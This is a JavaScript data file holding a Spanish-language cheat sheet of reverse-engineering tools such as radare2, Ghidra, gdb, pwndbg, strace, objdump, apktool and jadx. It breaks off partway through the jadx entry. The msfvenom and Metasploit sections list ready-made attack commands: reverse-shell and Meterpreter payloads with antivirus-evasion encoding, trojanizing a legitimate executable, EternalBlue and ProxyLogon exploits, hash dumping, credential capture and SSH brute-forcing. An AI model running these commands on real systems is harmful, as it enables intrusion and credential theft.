// Ingenieria Inversa (Reverse Engineering)
window.WIKI_CHEATSHEETS_16_REVERSE_ENG = [
 {
  "tool": "radare2",
  "desc": "Framework completo de ingeniería inversa",
  "commands": [
   {
    "cmd": "r2 binario",
    "desc": "Abrir binario"
   },
   {
    "cmd": "r2 -w binario",
    "desc": "Abrir en modo escritura"
   },
   {
    "cmd": "r2 -d ./programa",
    "desc": "Abrir en debugger"
   },
   {
    "cmd": "r2 -a x86 binario",
    "desc": "Arquitectura"
   },
   {
    "cmd": "r2 -A binario",
    "desc": "Analizar todo"
   },
   {
    "cmd": "r2 -q -c 'aaa' binario",
    "desc": "Auto análisis"
   },
   {
    "cmd": "r2 -c 'iI' binario",
    "desc": "Info del binario"
   },
   {
    "cmd": "r2 -c 'aaa; afl' binario",
    "desc": "Listar funciones"
   },
   {
    "cmd": "r2 -c 'aaa; pdf @main' binario",
    "desc": "Disasemblar main"
   },
   {
    "cmd": "r2 -c 'iz' binario",
    "desc": "Strings"
   },
   {
    "cmd": "r2 -c 'izz' binario",
    "desc": "Todos los strings"
   },
   {
    "cmd": "r2 -c 'ii' binario",
    "desc": "Imports"
   },
   {
    "cmd": "r2 -c 'iE' binario",
    "desc": "Exports"
   },
   {
    "cmd": "r2 -c 's main; V' binario",
    "desc": "Vista visual"
   },
   {
    "cmd": "r2 -c 's main; pdf' binario",
    "desc": "Disasm de main"
   },
   {
    "cmd": "r2 -c 'db main; dc' binario",
    "desc": "Breakpoint y run"
   },
   {
    "cmd": "r2 -c 'aaa; s sym.main; pdc' binario",
    "desc": "Decompile (pseudo)"
   },
   {
    "cmd": "r2 -c 'aaaa; afl~cmp' binario",
    "desc": "Filtrar funciones"
   },
   {
    "cmd": "r2 -c 'axt @ str.password' binario",
    "desc": "Referencias a string"
   },
   {
    "cmd": "r2 -c 's 0x401000; af; pdf' binario",
    "desc": "Analizar dirección"
   },
   {
    "cmd": "r2 -c 'w' -w binario",
    "desc": "Parchar byte"
   },
   {
    "cmd": "r2 -c 'wx 9090 @ 0x401000' -w binario",
    "desc": "Parchar NOPs"
   },
   {
    "cmd": "r2 -c 'cc' binario",
    "desc": "Coverage"
   },
   {
    "cmd": "r2 -c 'aaa; is~sym' binario",
    "desc": "Símbolos"
   },
   {
    "cmd": "r2 -c 'aaa; aflt' binario",
    "desc": "Funciones por tamaño"
   }
  ]
 },
 {
  "tool": "radare2-graph",
  "desc": "Gráficos de flujo de control (CFG) con r2",
  "commands": [
   {
    "cmd": "radare2-graph binario",
    "desc": "Generar CFG"
   },
   {
    "cmd": "radare2-graph -A binario",
    "desc": "Con análisis"
   },
   {
    "cmd": "radare2-graph -a x86 binario",
    "desc": "Arquitectura"
   },
   {
    "cmd": "radare2-graph -o graph.png binario",
    "desc": "Guardar PNG"
   },
   {
    "cmd": "radare2-graph -s main binario",
    "desc": "Solo función"
   },
   {
    "cmd": "radare2-graph -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "ghidra",
  "desc": "Suite de RE de la NSA (decompiler, GUI)",
  "commands": [
   {
    "cmd": "ghidra",
    "desc": "Abrir GUI"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj Proyecto -import binario",
    "desc": "Headless import"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj P -import bin -analysisTimeoutPerFile 120",
    "desc": "Con timeout"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj P -import bin -postScript script.py",
    "desc": "Con post-script"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj P -import bin -overwrite",
    "desc": "Sobrescribir"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj P -import bin -processObjects main",
    "desc": "Solo objetos"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj P -deleteProject",
    "desc": "Borrar proyecto"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj P -listProjects",
    "desc": "Listar proyectos"
   },
   {
    "cmd": "ghidra -import binario",
    "desc": "Importar"
   },
   {
    "cmd": "ghidra -script script.py",
    "desc": "Ejecutar script"
   }
  ]
 },
 {
  "tool": "cutter",
  "desc": "GUI para radare2 con decompilador integrado",
  "commands": [
   {
    "cmd": "cutter binario",
    "desc": "Abrir binario"
   },
   {
    "cmd": "cutter -d ./programa",
    "desc": "Debug mode"
   },
   {
    "cmd": "cutter -a x86 binario",
    "desc": "Arquitectura"
   },
   {
    "cmd": "cutter -p plugin.py binario",
    "desc": "Plugins"
   },
   {
    "cmd": "cutter -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "gdb",
  "desc": "GNU Debugger",
  "commands": [
   {
    "cmd": "gdb binario",
    "desc": "Abrir"
   },
   {
    "cmd": "gdb -q binario",
    "desc": "Quiet"
   },
   {
    "cmd": "gdb -q -x script.gdb binario",
    "desc": "Con script"
   },
   {
    "cmd": "gdb -q --batch -ex 'info functions' binario",
    "desc": "Funciones"
   },
   {
    "cmd": "gdb -q --batch -ex 'info variables' binario",
    "desc": "Variables"
   },
   {
    "cmd": "gdb -q -p PID",
    "desc": "Adjuntar a proceso"
   },
   {
    "cmd": "gdb -q binario core",
    "desc": "Con core dump"
   },
   {
    "cmd": "gdb -q -ex 'run' -ex 'bt' binario",
    "desc": "Run y backtrace"
   },
   {
    "cmd": "gdb -q -ex 'b *0x401000' -ex 'r' binario",
    "desc": "Breakpoint"
   },
   {
    "cmd": "gdb -q -ex 'x/s $rsp' binario",
    "desc": "Examinar memoria"
   },
   {
    "cmd": "gdb -q -ex 'info registers' binario",
    "desc": "Registros"
   },
   {
    "cmd": "gdb -q -ex 'disassemble main' binario",
    "desc": "Disasm"
   },
   {
    "cmd": "gdb -q -ex 'set disassembly-flavor intel' binario",
    "desc": "Sintaxis Intel"
   },
   {
    "cmd": "gdb -q -ex 'checksec' binario",
    "desc": "Checksec"
   },
   {
    "cmd": "gdb -q -ex 'x/20wx $rsp' binario",
    "desc": "Stack 20 words"
   },
   {
    "cmd": "gdb -q --args binario arg1 arg2",
    "desc": "Con argumentos"
   },
   {
    "cmd": "gdb -q -ex 'catch syscall write' binario",
    "desc": "Syscall catch"
   },
   {
    "cmd": "gdb -q -ex 'handle SIGSEGV stop print' binario",
    "desc": "Señales"
   }
  ]
 },
 {
  "tool": "pwndbg",
  "desc": "Plugin de GDB para exploit dev (heap, rop, gdb-gef)",
  "commands": [
   {
    "cmd": "gdb -q binario -ex 'pwndbg'",
    "desc": "Iniciar con pwndbg"
   },
   {
    "cmd": "gdb -q binario -ex 'checksec'",
    "desc": "Checksec"
   },
   {
    "cmd": "gdb -q binario -ex 'cyclic 200'",
    "desc": "Generar cyclic"
   },
   {
    "cmd": "gdb -q binario -ex 'x/20gx $rsp'",
    "desc": "Stack"
   },
   {
    "cmd": "gdb -q binario -ex 'rop'",
    "desc": "Gadgets ROP"
   },
   {
    "cmd": "gdb -q binario -ex 'find 0x41414141'",
    "desc": "Buscar offset"
   },
   {
    "cmd": "gdb -q binario -ex 'heap'",
    "desc": "Heap layout"
   },
   {
    "cmd": "gdb -q binario -ex 'bins'",
    "desc": "Bins"
   },
   {
    "cmd": "gdb -q binario -ex 'telescope $rsp'",
    "desc": "Telescope"
   },
   {
    "cmd": "gdb -q binario -ex 'shellcode'",
    "desc": "Shellcode search"
   },
   {
    "cmd": "gdb -q binario -ex 'got'",
    "desc": "GOT"
   },
   {
    "cmd": "gdb -q binario -ex 'plt'",
    "desc": "PLT"
   },
   {
    "cmd": "gdb -q binario -ex 'vmmap'",
    "desc": "Mapas de memoria"
   },
   {
    "cmd": "gdb -q binario -ex 'aslr'",
    "desc": "ASLR"
   },
   {
    "cmd": "gdb -q binario -ex 'canary'",
    "desc": "Canary"
   },
   {
    "cmd": "gdb -q binario -ex 'context'",
    "desc": "Contexto completo"
   },
   {
    "cmd": "gdb -q binario -ex 'gdb-gef'",
    "desc": "Alternativa gef"
   }
  ]
 },
 {
  "tool": "retdec",
  "desc": "Decompilador open source",
  "commands": [
   {
    "cmd": "retdec-decompiler binario",
    "desc": "Decompilar"
   },
   {
    "cmd": "retdec-decompiler binario -o out.c",
    "desc": "Salida a archivo"
   },
   {
    "cmd": "retdec-decompiler binario --arch x86",
    "desc": "Arquitectura"
   },
   {
    "cmd": "retdec-decompiler binario --no-code-sections",
    "desc": "Sin secciones"
   },
   {
    "cmd": "retdec-decompiler binario --graphs",
    "desc": "Generar grafos"
   },
   {
    "cmd": "retdec-decompiler binario -s",
    "desc": "Sin entrada"
   },
   {
    "cmd": "retdec-decompiler binario --verbose",
    "desc": "Verbose"
   },
   {
    "cmd": "retdec-decompiler binario --cleanup",
    "desc": "Limpiar"
   },
   {
    "cmd": "retdec-decompiler binario -f ida",
    "desc": "Formato IDA"
   },
   {
    "cmd": "retdec-decompiler binario --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "obfuscator",
  "desc": "Ofuscación de código (LLVM obfuscator)",
  "commands": [
   {
    "cmd": "obfuscator -o out.bin input.bc",
    "desc": "Ofuscar bitcode"
   },
   {
    "cmd": "obfuscator -fla -o out.bin input.bc",
    "desc": "Control flow flattening"
   },
   {
    "cmd": "obfuscator -sub -o out.bin input.bc",
    "desc": "Substitution"
   },
   {
    "cmd": "obfuscator -bcf -o out.bin input.bc",
    "desc": "Bogus control flow"
   },
   {
    "cmd": "obfuscator -fla -sub -bcf -o out.bin input.bc",
    "desc": "Todo"
   },
   {
    "cmd": "obfuscator -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "upx",
  "desc": "Empaquetador/compresor de ejecutables (también desempaqueta)",
  "commands": [
   {
    "cmd": "upx binario",
    "desc": "Comprimir"
   },
   {
    "cmd": "upx -o out binario",
    "desc": "Salida custom"
   },
   {
    "cmd": "upx -d binario",
    "desc": "Descomprimir"
   },
   {
    "cmd": "upx -9 binario",
    "desc": "Máxima compresión"
   },
   {
    "cmd": "upx --best binario",
    "desc": "Best"
   },
   {
    "cmd": "upx -k binario",
    "desc": "Keep backup"
   },
   {
    "cmd": "upx -t binario",
    "desc": "Testear"
   },
   {
    "cmd": "upx -v binario",
    "desc": "Verbose"
   },
   {
    "cmd": "upx --list binario",
    "desc": "Listar secciones"
   },
   {
    "cmd": "upx --lzma binario",
    "desc": "LZMA"
   },
   {
    "cmd": "upx -f binario",
    "desc": "Forzar"
   }
  ]
 },
 {
  "tool": "rabin2",
  "desc": "Herramienta de análisis de binarios (radare2 suite)",
  "commands": [
   {
    "cmd": "rabin2 -I binario",
    "desc": "Info completa"
   },
   {
    "cmd": "rabin2 -Ie binario",
    "desc": "Endianness"
   },
   {
    "cmd": "rabin2 -Iq binario",
    "desc": "Quiet"
   },
   {
    "cmd": "rabin2 -s binario",
    "desc": "Símbolos"
   },
   {
    "cmd": "rabin2 -i binario",
    "desc": "Imports"
   },
   {
    "cmd": "rabin2 -e binario",
    "desc": "Exports"
   },
   {
    "cmd": "rabin2 -z binario",
    "desc": "Strings"
   },
   {
    "cmd": "rabin2 -zz binario",
    "desc": "Todos los strings"
   },
   {
    "cmd": "rabin2 -S binario",
    "desc": "Secciones"
   },
   {
    "cmd": "rabin2 -l binario",
    "desc": "Librerías"
   },
   {
    "cmd": "rabin2 -C binario",
    "desc": "Fingerprint"
   },
   {
    "cmd": "rabin2 -H binario",
    "desc": "Headers"
   },
   {
    "cmd": "rabin2 -x binario",
    "desc": "Extraer todo"
   },
   {
    "cmd": "rabin2 -d binario",
    "desc": "Firma"
   },
   {
    "cmd": "rabin2 -e binario -f",
    "desc": "Fingerprint"
   },
   {
    "cmd": "rabin2 -t binario",
    "desc": "Tipo"
   },
   {
    "cmd": "rabin2 -L",
    "desc": "Listar formatos"
   },
   {
    "cmd": "rabin2 -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "radiff2",
  "desc": "Diffing de binarios (comparar funciones)",
  "commands": [
   {
    "cmd": "radiff2 bin1 bin2",
    "desc": "Comparar"
   },
   {
    "cmd": "radiff2 -a bin1 bin2",
    "desc": "Análisis de funciones"
   },
   {
    "cmd": "radiff2 -c bin1 bin2",
    "desc": "Calc hash"
   },
   {
    "cmd": "radiff2 -s bin1 bin2",
    "desc": "Similaridad"
   },
   {
    "cmd": "radiff2 -g bin1 bin2",
    "desc": "Graph diff"
   },
   {
    "cmd": "radiff2 -m bin1 bin2",
    "desc": "Modificaciones"
   },
   {
    "cmd": "radiff2 -t 0.8 bin1 bin2",
    "desc": "Threshold"
   },
   {
    "cmd": "radiff2 -j bin1 bin2",
    "desc": "JSON output"
   },
   {
    "cmd": "radiff2 -q bin1 bin2",
    "desc": "Quiet"
   },
   {
    "cmd": "radiff2 -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "binnavi",
  "desc": "Análisis binario con navegación de call graphs",
  "commands": [
   {
    "cmd": "binnavi",
    "desc": "Abrir GUI"
   },
   {
    "cmd": "binnavi -i binario",
    "desc": "Importar"
   },
   {
    "cmd": "binnavi -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "msfvenom-rev",
  "desc": "Generación de payloads con obfuscación (RE/AV)",
  "commands": [
   {
    "cmd": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf",
    "desc": "Reverse ELF"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe",
    "desc": "Meterpreter EXE"
   },
   {
    "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -e x86/shikata_ga_nai -i 5",
    "desc": "Cifrado + iteraciones"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -e x86/shikata_ga_nai -i 10",
    "desc": "HTTPS"
   },
   {
    "cmd": "msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php",
    "desc": "PHP"
   },
   {
    "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war",
    "desc": "JSP WAR"
   },
   {
    "cmd": "msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw",
    "desc": "Python"
   },
   {
    "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -x notepad.exe -k",
    "desc": "Template"
   },
   {
    "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o sc.bin",
    "desc": "Shellcode raw"
   },
   {
    "cmd": "msfvenom -p windows/x64/exec CMD=whoami -f exe -o cmd.exe",
    "desc": "Exec"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh-cmd",
    "desc": "PowerShell"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi",
    "desc": "MSI"
   },
   {
    "cmd": "msfvenom -p osx/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f macho -o shell.macho",
    "desc": "macOS"
   },
   {
    "cmd": "msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o apk.apk",
    "desc": "Android"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -a x64 --platform windows -o s.exe",
    "desc": "Explicit arch"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe --smallest",
    "desc": "Mínimo"
   }
  ]
 },
 {
  "tool": "metasploit-framework-rev",
  "desc": "Metasploit para encoders y evasión (RE)",
  "commands": [
   {
    "cmd": "msfconsole -q -x 'show encoders'",
    "desc": "Listar encoders"
   },
   {
    "cmd": "msfconsole -q -x 'use encoder/x86/shikata_ga_nai; show options'",
    "desc": "Usar encoder"
   },
   {
    "cmd": "msfconsole -q -x 'generate -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5'",
    "desc": "Generar"
   },
   {
    "cmd": "msfconsole -q -x 'use payload/windows/x64/exec; set CMD calc.exe; generate -f exe'",
    "desc": "Generar exec"
   },
   {
    "cmd": "msfconsole -q -x 'use payload/windows/meterpreter/reverse_tcp; set LHOST IP; generate -f raw'",
    "desc": "Raw"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_enumshares; run'",
    "desc": "Enumerar"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_enumusers; run'",
    "desc": "Usuarios SMB"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS IP; run'",
    "desc": "EternalBlue"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS IP; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP; run'",
    "desc": "Exploit"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; exploit -j'",
    "desc": "Handler"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/http/jboss_bsh_bshservlet; set RHOSTS IP; run'",
    "desc": "JBoss"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/script/web_delivery; set TARGET 2; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST IP; set SRVPORT 8080; run'",
    "desc": "Web delivery"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/capture/http_basic; run'",
    "desc": "Captura creds"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/gather/hashdump; set SESSION 1; run'",
    "desc": "Hashdump"
   },
   {
    "cmd": "msfconsole -q -x 'use post/multi/gather/env; set SESSION 1; run'",
    "desc": "Env"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/manage/migrate; set SESSION 1; run'",
    "desc": "Migrate"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/gather/win_privs; set SESSION 1; run'",
    "desc": "Privs"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS IP; run'",
    "desc": "Portscan"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS IP; run'",
    "desc": "HTTP version"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE rockyou.txt; run'",
    "desc": "SSH login"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/http/struts2_content_type_ognl; set RHOSTS IP; run'",
    "desc": "Struts2"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/http/drupal_drupalgeddon2; set RHOSTS IP; run'",
    "desc": "Drupal"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS IP; run'",
    "desc": "WP shell"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/http/joomla_http_header_rce; set RHOSTS IP; run'",
    "desc": "Joomla"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/misc/hta_server; set SRVHOST IP; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP; run'",
    "desc": "HTA server"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/local/ms16_075_reflection_juicy; set SESSION 1; run'",
    "desc": "Potato"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/windows/http/exchange_proxylogon_rce; set RHOSTS IP; run'",
    "desc": "ProxyLogon"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS IP; run'",
    "desc": "Tomcat manager"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_login; set RHOSTS IP; run'",
    "desc": "MySQL login"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_login; set RHOSTS IP; run'",
    "desc": "Postgres login"
   }
  ]
 },
 {
  "tool": "pwntools",
  "desc": "CTF/exploit dev toolkit (Python) - pwn",
  "commands": [
   {
    "cmd": "pwn cyclic 100",
    "desc": "Generar cyclic"
   },
   {
    "cmd": "pwn cyclic -l 0x61616164",
    "desc": "Buscar offset"
   },
   {
    "cmd": "pwn checksec binario",
    "desc": "Checksec"
   },
   {
    "cmd": "pwn asm 'mov rax, 1'",
    "desc": "Ensamblar"
   },
   {
    "cmd": "pwn disasm '\\x48\\xc7\\xc0'",
    "desc": "Desensamblar"
   },
   {
    "cmd": "pwn hexdump -s 0x100 binario",
    "desc": "Hexdump"
   },
   {
    "cmd": "pwn shellcraft -f hex amd64.linux.sh",
    "desc": "Shellcode sh"
   },
   {
    "cmd": "pwn shellcraft amd64.linux.cat /etc/passwd -f hex",
    "desc": "Cat shellcode"
   },
   {
    "cmd": "pwn shellcraft amd64.linux.findpeek",
    "desc": "Find peek"
   },
   {
    "cmd": "pwn constgrep -m amd64 SYS_execve",
    "desc": "Constantes syscall"
   },
   {
    "cmd": "pwn template --host IP --port 4444",
    "desc": "Template de exploit"
   },
   {
    "cmd": "pwn debug binario",
    "desc": "Debug"
   },
   {
    "cmd": "pwn phd binario",
    "desc": "Info del binario"
   },
   {
    "cmd": "pwn rop binario",
    "desc": "ROP gadgets"
   },
   {
    "cmd": "pwn errno 13",
    "desc": "Descripción errno"
   },
   {
    "cmd": "pwn uptime",
    "desc": "Uptime"
   },
   {
    "cmd": "pwn version",
    "desc": "Versión"
   },
   {
    "cmd": "pwn help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "angr",
  "desc": "Ejecución simbólica (framework RE)",
  "commands": [
   {
    "cmd": "angr -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "python3 -c 'import angr; p = angr.Project(\"binario\"); print(p)'",
    "desc": "Proyecto"
   },
   {
    "cmd": "python3 -c 'import angr; p=angr.Project(\"b\"); s=p.factory.entry_state(); sm=p.factory.simulation_manager(s); sm.explore(); print(sm.found)'",
    "desc": "Explorar"
   }
  ]
 },
 {
  "tool": "rz-ghidra",
  "desc": "Decompilador Ghidra integrado en rizin/radare2",
  "commands": [
   {
    "cmd": "rz-ghidra -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "r2 -c 'r2ghidra -a' binario",
    "desc": "Activar decompiler"
   },
   {
    "cmd": "r2 -c 'r2ghidra -d main' binario",
    "desc": "Decompile función"
   }
  ]
 },
 {
  "tool": "strace",
  "desc": "Trazar syscalls de procesos",
  "commands": [
   {
    "cmd": "strace -f ./binario",
    "desc": "Trazar fork"
   },
   {
    "cmd": "strace -e trace=open,read ./binario",
    "desc": "Solo open/read"
   },
   {
    "cmd": "strace -e trace=network ./binario",
    "desc": "Syscalls de red"
   },
   {
    "cmd": "strace -e trace=write -o out.txt ./binario",
    "desc": "Solo write"
   },
   {
    "cmd": "strace -c ./binario",
    "desc": "Resumen"
   },
   {
    "cmd": "strace -p PID",
    "desc": "Adjuntar"
   },
   {
    "cmd": "strace -f -p PID",
    "desc": "Adjuntar con fork"
   },
   {
    "cmd": "strace -tt ./binario",
    "desc": "Timestamps"
   },
   {
    "cmd": "strace -o /tmp/trace.txt ./binario",
    "desc": "Salida"
   },
   {
    "cmd": "strace -s 256 ./binario",
    "desc": "Tamaño de strings"
   },
   {
    "cmd": "strace -v ./binario",
    "desc": "Verbose"
   },
   {
    "cmd": "strace -x ./binario",
    "desc": "Hex strings"
   },
   {
    "cmd": "strace -e trace=openat -f ./binario",
    "desc": "Solo openat"
   },
   {
    "cmd": "strace -e signal=all ./binario",
    "desc": "Señales"
   },
   {
    "cmd": "strace --syscall-limit 100 ./binario",
    "desc": "Límite"
   },
   {
    "cmd": "strace -V",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "ltrace",
  "desc": "Trazar llamadas a librerías dinámicas",
  "commands": [
   {
    "cmd": "ltrace ./binario",
    "desc": "Trazar"
   },
   {
    "cmd": "ltrace -e malloc+free ./binario",
    "desc": "Solo malloc/free"
   },
   {
    "cmd": "ltrace -c ./binario",
    "desc": "Resumen"
   },
   {
    "cmd": "ltrace -f ./binario",
    "desc": "Con forks"
   },
   {
    "cmd": "ltrace -p PID",
    "desc": "Adjuntar"
   },
   {
    "cmd": "ltrace -o out.txt ./binario",
    "desc": "Salida"
   },
   {
    "cmd": "ltrace -s 256 ./binario",
    "desc": "Strings largos"
   },
   {
    "cmd": "ltrace -tt ./binario",
    "desc": "Timestamps"
   },
   {
    "cmd": "ltrace -l libc.so.6 ./binario",
    "desc": "Solo librería"
   },
   {
    "cmd": "ltrace -L ./binario",
    "desc": "Incluir main"
   },
   {
    "cmd": "ltrace -V",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "objdump",
  "desc": "Disassembler de GNU binutils",
  "commands": [
   {
    "cmd": "objdump -d binario",
    "desc": "Disasm"
   },
   {
    "cmd": "objdump -d -M intel binario",
    "desc": "Sintaxis Intel"
   },
   {
    "cmd": "objdump -d -M att binario",
    "desc": "AT&T"
   },
   {
    "cmd": "objdump -h binario",
    "desc": "Secciones"
   },
   {
    "cmd": "objdump -s -j .text binario",
    "desc": "Hex de sección"
   },
   {
    "cmd": "objdump -f binario",
    "desc": "Header"
   },
   {
    "cmd": "objdump -p binario",
    "desc": "Headers de programa"
   },
   {
    "cmd": "objdump -t binario",
    "desc": "Símbolos"
   },
   {
    "cmd": "objdump -T binario",
    "desc": "Símbolos dinámicos"
   },
   {
    "cmd": "objdump -R binario",
    "desc": "Relocations"
   },
   {
    "cmd": "objdump -d -j .plt binario",
    "desc": "Solo PLT"
   },
   {
    "cmd": "objdump -d -j .got binario",
    "desc": "Solo GOT"
   },
   {
    "cmd": "objdump -M intel -d --no-show-raw-insn binario",
    "desc": "Sin bytes"
   },
   {
    "cmd": "objdump -d -l binario",
    "desc": "Con líneas"
   },
   {
    "cmd": "objdump -x binario",
    "desc": "Todo"
   },
   {
    "cmd": "objdump -S binario",
    "desc": "Con código fuente"
   },
   {
    "cmd": "objdump -i",
    "desc": "Listar formatos"
   },
   {
    "cmd": "objdump --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "readelf",
  "desc": "Leer headers ELF",
  "commands": [
   {
    "cmd": "readelf -h binario",
    "desc": "Header"
   },
   {
    "cmd": "readelf -l binario",
    "desc": "Segmentos"
   },
   {
    "cmd": "readelf -S binario",
    "desc": "Secciones"
   },
   {
    "cmd": "readelf -s binario",
    "desc": "Símbolos"
   },
   {
    "cmd": "readelf -d binario",
    "desc": "Dynamic"
   },
   {
    "cmd": "readelf -r binario",
    "desc": "Relocations"
   },
   {
    "cmd": "readelf -a binario",
    "desc": "Todo"
   },
   {
    "cmd": "readelf -n binario",
    "desc": "Notas"
   },
   {
    "cmd": "readelf -V binario",
    "desc": "Versiones"
   },
   {
    "cmd": "readelf -I binario",
    "desc": "Historia"
   },
   {
    "cmd": "readelf -x .text binario",
    "desc": "Hex sección"
   },
   {
    "cmd": "readelf -p .comment binario",
    "desc": "Strings sección"
   },
   {
    "cmd": "readelf -W -h binario",
    "desc": "Wide"
   },
   {
    "cmd": "readelf --version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "strings",
  "desc": "Extraer strings legibles de binarios",
  "commands": [
   {
    "cmd": "strings binario",
    "desc": "Strings"
   },
   {
    "cmd": "strings -n 6 binario",
    "desc": "Mínimo 6 chars"
   },
   {
    "cmd": "strings -a binario",
    "desc": "Todo el archivo"
   },
   {
    "cmd": "strings -t x binario",
    "desc": "Offset hex"
   },
   {
    "cmd": "strings -t d binario",
    "desc": "Offset decimal"
   },
   {
    "cmd": "strings -e l binario",
    "desc": "Unicode little"
   },
   {
    "cmd": "strings -e b binario",
    "desc": "Unicode big"
   },
   {
    "cmd": "strings -e S binario",
    "desc": "Single-byte"
   },
   {
    "cmd": "strings binario | grep -i password",
    "desc": "Buscar password"
   },
   {
    "cmd": "strings binario | grep -i 'http'",
    "desc": "URLs"
   },
   {
    "cmd": "strings -n 10 binario | head -50",
    "desc": "Primeros 50"
   },
   {
    "cmd": "strings -f binario",
    "desc": "Con nombre de archivo"
   },
   {
    "cmd": "strings -o binario",
    "desc": "Offset octal"
   },
   {
    "cmd": "strings --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "apktool",
  "desc": "Decompilar/reempaquetar APKs",
  "commands": [
   {
    "cmd": "apktool d app.apk",
    "desc": "Decompilar"
   },
   {
    "cmd": "apktool d app.apk -o /tmp/out",
    "desc": "Directorio"
   },
   {
    "cmd": "apktool d app.apk -s",
    "desc": "Sin smali"
   },
   {
    "cmd": "apktool d app.apk -f",
    "desc": "Forzar"
   },
   {
    "cmd": "apktool d app.apk -r",
    "desc": "Sin recursos"
   },
   {
    "cmd": "apktool d app.apk --no-src",
    "desc": "Sin código"
   },
   {
    "cmd": "apktool b /tmp/out -o new.apk",
    "desc": "Recompilar"
   },
   {
    "cmd": "apktool b /tmp/out -o new.apk --use-aapt2",
    "desc": "Con aapt2"
   },
   {
    "cmd": "apktool b /tmp/out -o new.apk -p /tmp/framework",
    "desc": "Framework"
   },
   {
    "cmd": "apktool if framework.apk",
    "desc": "Instalar framework"
   },
   {
    "cmd": "apktool d app.apk --only-main-classes",
    "desc": "Solo main"
   },
   {
    "cmd": "apktool --version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "jadx",
  "desc": "Decompilador de APK/DEX a Java",
  "commands": [
   {
    "cmd": "jadx app.apk",
    "desc": "Decompilar"
   },
   {
    "cmd": "jadx app.apk -d /tmp/out",
    "desc": "Directorio"
   },
   {
    "cmd": "jadx -r app.apk",
    "desc": "Sin recursos"
   },
   {
    "cmd": "jadx -s app.apk",
